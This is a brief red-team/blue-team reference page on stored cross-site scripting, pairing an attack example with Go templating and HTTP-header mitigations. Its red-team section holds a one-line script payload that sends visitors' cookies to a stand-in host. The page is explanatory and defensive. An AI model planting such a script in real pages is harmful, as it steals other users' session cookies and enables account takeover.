# Sored XSS

Stored XSS attacks are XXS attacks that are stored on the host's server.

## Red Team

You may be able to include a script in certain fields or posts on a page or forum. Whenever another user visits a page with that content your script will run.

```html
<!-- example content to send a user's cookies to your own server -->
<script>fetch('example.com', { method: 'POST', body: document.cookie });</script>
```

## Blue Team

Sanitize all input before rendering it on a web page.

```go
// Good
// Use renderers that automatically escape input text
import("html/template")

// Bad
import("text/template")
```

Additional mitigations:

* Use the [HttpOnly cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies) flag on cookies to prevent browser clients from accessing them
* Use the [Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) HTTP header to restrict page content sources
* Use the [X-XSS-Protection](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection) HTTP header to tell browsers not to render the web page if an XSS attack is suspected in the page content
